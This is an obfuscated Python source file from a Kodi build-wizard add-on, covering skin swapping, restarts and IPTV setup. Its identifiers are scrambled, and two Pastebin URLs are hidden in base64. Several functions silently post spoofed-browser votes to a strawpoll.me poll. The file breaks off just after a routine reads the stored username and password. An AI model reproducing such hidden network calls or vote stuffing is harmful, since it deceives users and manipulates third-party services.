# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	OOOOOOOOOO00000O0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	OOOO00OOO000O0OOO =[];O00O0O0OO00OO00O0 =[]#line:267
	for O0OO000OOO0OO0000 in sorted (OOOOOOOOOO00000O0 ,key =lambda O000O000OOO0000O0 :O000O000OOO0000O0 ):#line:268
		O00O0O00OO0OO0O00 =os .path .split (O0OO000OOO0OO0000 [:-1 ])[1 ]#line:269
		O00OO000OOO00O00O =os .path .join (O0OO000OOO0OO0000 ,'addon.xml')#line:270
		if os .path .exists (O00OO000OOO00O00O ):#line:271
			O0OOOOOOO0O0O0OOO =open (O00OO000OOO00O00O )#line:272
			OOO0O00O00O0OO0OO =O0OOOOOOO0O0O0OOO .read ()#line:273
			OOOO00OO0000OO0O0 =parseDOM2 (OOO0O00O00O0OO0OO ,'addon',ret ='id')#line:274
			OO0O0OO0O000OO0OO =O00O0O00OO0OO0O00 if len (OOOO00OO0000OO0O0 )==0 else OOOO00OO0000OO0O0 [0 ]#line:275
			try :#line:276
				OOOO0O00OOO00000O =xbmcaddon .Addon (id =OO0O0OO0O000OO0OO )#line:277
				OOOO00OOO000O0OOO .append (OOOO0O00OOO00000O .getAddonInfo ('name'))#line:278
				O00O0O0OO00OO00O0 .append (OO0O0OO0O000OO0OO )#line:279
			except :#line:280
				pass #line:281
	O0O0OO0OO00000O0O =[];O0OO00OOO00O00000 =0 #line:282
	O0OOOO0OOOOOOOOOO =["Current Skin -- %s"%currSkin ()]+OOOO00OOO000O0OOO #line:283
	O0OO00OOO00O00000 =DIALOG .select ("Select the Skin you want to swap with.",O0OOOO0OOOOOOOOOO )#line:284
	if O0OO00OOO00O00000 ==-1 :return #line:285
	else :#line:286
		OOO00O00OOOO000OO =(O0OO00OOO00O00000 -1 )#line:287
		O0O0OO0OO00000O0O .append (OOO00O00OOOO000OO )#line:288
		O0OOOO0OOOOOOOOOO [O0OO00OOO00O00000 ]="%s"%(OOOO00OOO000O0OOO [OOO00O00OOOO000OO ])#line:289
	if O0O0OO0OO00000O0O ==None :return #line:290
	for OO0O0O000OOO000OO in O0O0OO0OO00000O0O :#line:291
		swapSkins (O00O0O0OO00OO00O0 [OO0O0O000OOO000OO ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (O0OO0OOO0OOO0000O ,title ="Error"):#line:296
	OO0O0O00OOO0O0O0O ='lookandfeel.skin'#line:297
	O0O0OO000OOOO0O0O =O0OO0OOO0OOO0000O #line:298
	O000O00OOO0OO0O00 =getOld (OO0O0O00OOO0O0O0O )#line:299
	O00O000O0O0O0OO00 =OO0O0O00OOO0O0O0O #line:300
	setNew (O00O000O0O0O0OO00 ,O0O0OO000OOOO0O0O )#line:301
	OOOOOOO0OO00OOO0O =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOOOO0OO00OOO0O <100 :#line:303
		OOOOOOO0OO00OOO0O +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (O00O00O0000OO0000 ):#line:310
	try :#line:311
		O00O00O0000OO0000 ='"%s"'%O00O00O0000OO0000 #line:312
		OO0O000O0O0000OO0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O00O00O0000OO0000 )#line:313
		OOO000OO00O00OO00 =xbmc .executeJSONRPC (OO0O000O0O0000OO0 )#line:315
		OOO000OO00O00OO00 =simplejson .loads (OOO000OO00O00OO00 )#line:316
		if OOO000OO00O00OO00 .has_key ('result'):#line:317
			if OOO000OO00O00OO00 ['result'].has_key ('value'):#line:318
				return OOO000OO00O00OO00 ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (OOO0000OO00000O0O ,OOO00O00O000OOOOO ):#line:325
	try :#line:326
		OOO0000OO00000O0O ='"%s"'%OOO0000OO00000O0O #line:327
		OOO00O00O000OOOOO ='"%s"'%OOO00O00O000OOOOO #line:328
		OOOO000O0OO000000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO0000OO00000O0O ,OOO00O00O000OOOOO )#line:329
		OOO0O0O000OOOOO0O =xbmc .executeJSONRPC (OOOO000O0OO000000 )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			OO0O0O0OOOOOO00OO =xbmcgui .DialogProgress ()#line:340
			OO0O0O0OOOOOO00OO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			OO0O0O0OOOOOO00OO .update (0 )#line:344
			for O0O00OO0OOOO0000O in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				OO0O0O0OOOOOO00OO .update (int ((5 -O0O00OO0OOOO0000O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0O00OO0OOOO0000O ),'')#line:347
				if OO0O0O0OOOOOO00OO .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			OO0O0O0OOOOOO00OO =xbmcgui .DialogProgress ()#line:353
			OO0O0O0OOOOOO00OO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			OO0O0O0OOOOOO00OO .update (0 )#line:357
			for O0O00OO0OOOO0000O in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				OO0O0O0OOOOOO00OO .update (int ((5 -O0O00OO0OOOO0000O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0O00OO0OOOO0000O ),'')#line:360
				if OO0O0O0OOOOOO00OO .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    OOO0O00O0O000O000 ='18773068'#line:373
    O00OOOO0O0OOO0O00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOO0O00O0O000O000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    OOO00OO00OOO00O00 ='145273320'#line:387
    O0O0OOOOOO00O0O00 ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        O0OO0000OOO0OO0O0 =OOO00OO00OOO00O00 #line:390
    else :#line:391
        O0OO0000OOO0OO0O0 =O0O0OOOOOO00O0O00 #line:392
    O0OO0O00O000000OO ={'options':O0OO0000OOO0OO0O0 }#line:396
    OOO00OOO000O000O0 =requests .post ('https://www.strawpoll.me/'+OOO0O00O0O000O000 ,headers =O00OOOO0O0OOO0O00 ,data =O0OO0O00O000000OO )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        OOO0OO00O00000000 ='18773068'#line:402
        OOOOOOOO00OO00000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOO0OO00O00000000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        O00O0OO0O00OO0O00 ='145273320'#line:416
        O0O000O0O0000O0OO ={'options':O00O0OO0O00OO0O00 }#line:422
        O0O000O000OO00000 =requests .post ('https://www.strawpoll.me/'+OOO0OO00O00000000 ,headers =OOOOOOOO00OO00000 ,data =O0O000O0O0000O0OO )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        O0O0O0000OO00OO00 ='18773068'#line:429
        OOOO00O0O0OOO0000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0O0000OO00OO00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        O0O0OOO000OOOOOO0 ='145273321'#line:443
        O0000O0OO000OOOO0 ={'options':O0O0OOO000OOOOOO0 }#line:449
        OO00OOO00OOO0O0O0 =requests .post ('https://www.strawpoll.me/'+O0O0O0000OO00OO00 ,headers =OOOO00O0O0OOO0000 ,data =O0000O0OO000OOOO0 )#line:451
   except :pass #line:452
def testcommand ():#line:456
 OOO0O0O0OO00O00OO =os .path .dirname (os .path .realpath (__file__ ))#line:457
 O0000O000000O00O0 =os .path .join (OOO0O0O0OO00O00OO ,'changelog.txt')#line:458
 OOOOOOO0000O0O0O0 =open (O0000O000000O00O0 ,'r')#line:459
 O00O0O00OO000000O =OOOOOOO0000O0O0O0 .read ()#line:460
 OOO0000O0OOOO0O0O =O00O0O00OO000000O #line:461
 notify .updateinfo (OOO0000O0OOOO0O0O ,True )#line:462
def skin_homeselect ():#line:463
	try :#line:465
		O0OOO0OO0OOOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:466
		OOO000O0000O0OOO0 =open (O0OOO0OO0OOOOO00O ,'r')#line:468
		OOO00OO0O0O0O0000 =OOO000O0000O0OOO0 .read ()#line:469
		OOO000O0000O0OOO0 .close ()#line:470
		O0OO00O0OOOO000O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:471
		O0O0OOOOO0O0OO0OO =re .compile (O0OO00O0OOOO000O0 ).findall (OOO00OO0O0O0O0000 )[0 ]#line:472
		OOO000O0000O0OOO0 =open (O0OOO0OO0OOOOO00O ,'w')#line:473
		OOO000O0000O0OOO0 .write (OOO00OO0O0O0O0000 .replace ('<setting id="HomeS" type="string%s/setting>'%O0O0OOOOO0O0OO0OO ,'<setting id="HomeS" type="string"></setting>'))#line:474
		OOO000O0000O0OOO0 .close ()#line:475
	except :#line:476
		pass #line:477
def autotrakt ():#line:480
    O0OOOOOOOO00O0O00 =(ADDON .getSetting ("auto_trk"))#line:481
    if O0OOOOOOOO00O0O00 =='true':#line:482
       from resources .libs import trk_aut #line:483
def traktsync ():#line:485
     OOOO00OOOO0OOOO0O =(ADDON .getSetting ("auto_trk"))#line:486
     if OOOO00OOOO0OOOO0O =='true':#line:487
       from resources .libs import trk_aut #line:490
     else :#line:491
        ADDON .openSettings ()#line:492
def imdb_synck ():#line:494
   try :#line:495
     OOOO0O0000OOO0O0O =xbmcaddon .Addon ('plugin.video.exodusredux')#line:496
     O00O0OO0OOOOOOO0O =xbmcaddon .Addon ('plugin.video.gaia')#line:497
     O00O0OOOOO0OOOOO0 =(ADDON .getSetting ("imdb_sync"))#line:498
     O0O0000OO0OOOO0O0 ="imdb.user"#line:499
     OOO00O00OO0000OOO ="accounts.informants.imdb.user"#line:500
     OOOO0O0000OOO0O0O .setSetting (O0O0000OO0OOOO0O0 ,str (O00O0OOOOO0OOOOO0 ))#line:501
     O00O0OO0OOOOOOO0O .setSetting ('accounts.informants.imdb.enabled','true')#line:502
     O00O0OO0OOOOOOO0O .setSetting (OOO00O00OO0000OOO ,str (O00O0OOOOO0OOOOO0 ))#line:503
   except :pass #line:504
def dis_or_enable_addon (OOOO0OOOOOOO0000O ,O0OOOOOO000OO0OO0 ,enable ="true"):#line:506
    import json #line:507
    O0000OOOOO00O00O0 ='"%s"'%OOOO0OOOOOOO0000O #line:508
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO0OOOOOOO0000O )and enable =="true":#line:509
        logging .warning ('already Enabled')#line:510
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOO0OOOOOOO0000O )#line:511
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO0OOOOOOO0000O )and enable =="false":#line:512
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOO0OOOOOOO0000O )#line:513
    else :#line:514
        OOOOO0OOO0O0OO0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0000OOOOO00O00O0 ,enable )#line:515
        O0OOOO0OO00O0O0O0 =xbmc .executeJSONRPC (OOOOO0OOO0O0OO0O0 )#line:516
        OO0O0O0OO0000O0OO =json .loads (O0OOOO0OO00O0O0O0 )#line:517
        if enable =="true":#line:518
            xbmc .log ("### Enabled %s, response = %s"%(OOOO0OOOOOOO0000O ,OO0O0O0OO0000O0OO ))#line:519
        else :#line:520
            xbmc .log ("### Disabled %s, response = %s"%(OOOO0OOOOOOO0000O ,OO0O0O0OO0000O0OO ))#line:521
    if O0OOOOOO000OO0OO0 =='auto':#line:522
     return True #line:523
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:524
def iptvset ():#line:527
  try :#line:528
    OOOO0O0OOOO0OO000 =(ADDON .getSetting ("iptv_on"))#line:529
    if OOOO0O0OOOO0OO000 =='true':#line:531
       if KODIV >=17 and KODIV <18 :#line:533
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:534
         O0OO0O0O0OO0OO0O0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:535
         O000000000OO0O0O0 =(ADDON .getSetting ("iptvUrl"))#line:537
         O0OO0O0O0OO0OO0O0 .setSetting ('m3uUrl',O000000000OO0O0O0 )#line:538
         OOOO00000O00OO0O0 =(ADDON .getSetting ("epg_Url"))#line:539
         O0OO0O0O0OO0OO0O0 .setSetting ('epgUrl',OOOO00000O00OO0O0 )#line:540
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:543
         iptvsimpldownpc ()#line:544
         wiz .kodi17Fix ()#line:545
         xbmc .sleep (1000 )#line:546
         O0OO0O0O0OO0OO0O0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:547
         O000000000OO0O0O0 =(ADDON .getSetting ("iptvUrl"))#line:548
         O0OO0O0O0OO0OO0O0 .setSetting ('m3uUrl',O000000000OO0O0O0 )#line:549
         OOOO00000O00OO0O0 =(ADDON .getSetting ("epg_Url"))#line:550
         O0OO0O0O0OO0OO0O0 .setSetting ('epgUrl',OOOO00000O00OO0O0 )#line:551
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:553
         iptvsimpldown ()#line:554
         wiz .kodi17Fix ()#line:555
         xbmc .sleep (1000 )#line:556
         O0OO0O0O0OO0OO0O0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:557
         O000000000OO0O0O0 =(ADDON .getSetting ("iptvUrl"))#line:558
         O0OO0O0O0OO0OO0O0 .setSetting ('m3uUrl',O000000000OO0O0O0 )#line:559
         OOOO00000O00OO0O0 =(ADDON .getSetting ("epg_Url"))#line:560
         O0OO0O0O0OO0OO0O0 .setSetting ('epgUrl',OOOO00000O00OO0O0 )#line:561
  except :pass #line:562
def howsentlog ():#line:569
       try :#line:570
          import json #line:571
          OO0O00OO00OOO0O0O =(ADDON .getSetting ("user"))#line:572
          OO000OO00000OO00O =(ADDON .getSetting ("pass"))#line:573
          O0000OO000OO0O0O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:574
